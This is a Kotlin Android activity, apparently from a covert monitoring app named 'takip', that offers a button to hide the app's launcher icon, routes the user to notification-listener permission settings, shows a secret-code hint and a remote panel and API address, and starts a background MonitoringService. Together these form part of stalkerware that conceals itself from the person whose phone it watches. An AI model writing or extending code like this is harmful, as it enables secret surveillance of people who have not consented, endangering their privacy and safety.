package com.takip.app.ui

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import com.takip.app.databinding.ActivityHiddenSettingsBinding
import com.takip.app.service.MonitoringService
import com.takip.app.util.AppHider
import com.takip.app.util.PrefsManager

class HiddenSettingsActivity : AppCompatActivity() {

    private lateinit var binding: ActivityHiddenSettingsBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityHiddenSettingsBinding.inflate(layoutInflater)
        setContentView(binding.root)

        updateStatus()

        binding.hideButton.setOnClickListener {
            AppHider.hideLauncherIcon(this)
            updateStatus()
        }

        binding.permissionsButton.setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        binding.secretCodeText.text = getString(R.string.secret_code_hint)
    }

    private fun updateStatus() {
        val status = buildString {
            appendLine("Panel: ${PrefsManager.panelUrl ?: "-"}")
            appendLine("API: ${PrefsManager.apiBaseUrl ?: "-"}")
            appendLine("E-posta: ${PrefsManager.userEmail ?: "-"}")
            appendLine("Cihaz ID: ${PrefsManager.deviceId ?: "-"}")
            appendLine("Kurulum: ${if (PrefsManager.isSetupComplete) "Tamamlandı" else "Bekliyor"}")
            appendLine("Gizli: ${if (PrefsManager.isHidden) "Evet" else "Hayır"}")
            appendLine("Servis: Aktif")
        }
        binding.statusText.text = status

        if (!PrefsManager.isSetupComplete) return
        MonitoringService.start(this)
    }
}
